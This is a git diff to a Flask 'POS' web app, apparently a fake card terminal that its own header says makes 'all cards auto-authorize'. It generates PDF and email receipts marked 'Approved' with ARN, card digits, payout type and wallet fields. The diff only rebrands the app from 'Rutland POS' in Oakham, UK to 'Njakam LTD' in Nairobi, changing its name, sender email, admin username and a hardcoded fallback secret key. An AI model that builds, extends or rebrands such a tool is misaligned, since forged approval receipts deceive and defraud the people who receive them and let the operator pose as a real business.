@@ -1,4 +1,4 @@
-# app.py - cleaned RUTLAND POS (all cards auto-authorize)
+# app.py - cleaned NJAKAM LTD POS (all cards auto-authorize)
 from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
 from flask_mail import Mail, Message
 import random, logging, os, hashlib, json, re, tempfile
@@ -16,7 +16,7 @@ load_dotenv(dotenv_path='.env')
 logging.basicConfig(level=logging.INFO)
 
 app = Flask(__name__)
-app.secret_key = os.environ.get('SECRET_KEY', 'rutland_secret_key_8583')
+app.secret_key = os.environ.get('SECRET_KEY', 'njakamltd_secret_key_8583')
 
 # Email Configuration
 app.config['MAIL_SERVER'] = os.environ.get('MAIL_SERVER', 'smtp.gmail.com')
@@ -32,7 +32,7 @@ app.config['MAIL_USE_SSL'] = (mail_use_ssl_env.lower() == 'true') if mail_use_ss
 app.config['MAIL_USE_TLS'] = (mail_use_tls_env.lower() == 'true') if mail_use_tls_env is not None else (app.config['MAIL_PORT'] == 587 and not app.config['MAIL_USE_SSL'])
 app.config['MAIL_USERNAME'] = os.environ.get('MAIL_USERNAME', '')
 app.config['MAIL_PASSWORD'] = os.environ.get('MAIL_PASSWORD', '')
-app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'noreply@rutlandpos.com')
+app.config['MAIL_DEFAULT_SENDER'] = os.environ.get('MAIL_DEFAULT_SENDER', 'support@njakamltd.com')
 mail = Mail(app)
 
 # Fixed numeric Server ID for receipts (env SERVER_ID = digits only, e.g. "123456"; default "000000")
@@ -80,7 +80,7 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
         
         # Header
         c.setFont("Helvetica-Bold", 14)
-        c.drawString(180, y, "RUTLAND POS")
+        c.drawString(180, y, "NJAKAM LTD")
         y -= 20
         c.setFont("Helvetica", 10)
         c.drawString(180, y, "CUSTOMER COPY")
@@ -167,7 +167,7 @@ def _build_receipt_pdf_bytes(txn_id, arn, pan_last4, amount, payout_type, wallet
         raise
 
 # Configuration
-USERNAME = "rutlandadmin"
+USERNAME = "njakamaltd"
 PASSWORD_FILE = "password.json"
 
 # Ensure password file exists
@@ -530,11 +530,11 @@ def success():
             )
             
             # Create email message
-            subject = f"Rutland POS Receipt - Transaction {session.get('txn_id')}"
+            subject = f"Njakam LTD Receipt - Transaction {session.get('txn_id')}"
             
             body = f"""Dear Customer,
 
-Thank you for your transaction at Rutland POS.
+Thank you for your transaction at Njakam LTD.
 
 Please find your receipt attached as a PDF.
 
@@ -545,8 +545,8 @@ Transaction Summary:
 - Status: Approved
 
 ---
-Rutland POS Terminal
-Oakham, UK
+Njakam LTD Terminal
+74428 - 00200 Nairobi
 
 This is an automated receipt. Please keep for your records.
             """
@@ -722,11 +722,11 @@ def send_receipt_email():
         )
         
         # Create email message
-        subject = f"Rutland POS Receipt - Transaction {session.get('txn_id')}"
+        subject = f"Njakam LTD Receipt - Transaction {session.get('txn_id')}"
         
         body = f"""Dear Customer,
 
-Thank you for your transaction at Rutland POS.
+Thank you for your transaction at Njakam LTD.
 
 Please find your receipt attached as a PDF.
 
@@ -737,8 +737,8 @@ Transaction Summary:
 - Status: Approved
 
 ---
-Rutland POS Terminal
-Oakham, UK
+Njakam LTD Terminal
+74428 - 00200 Nairobi
 
 This is an automated receipt. Please keep for your records.
         """
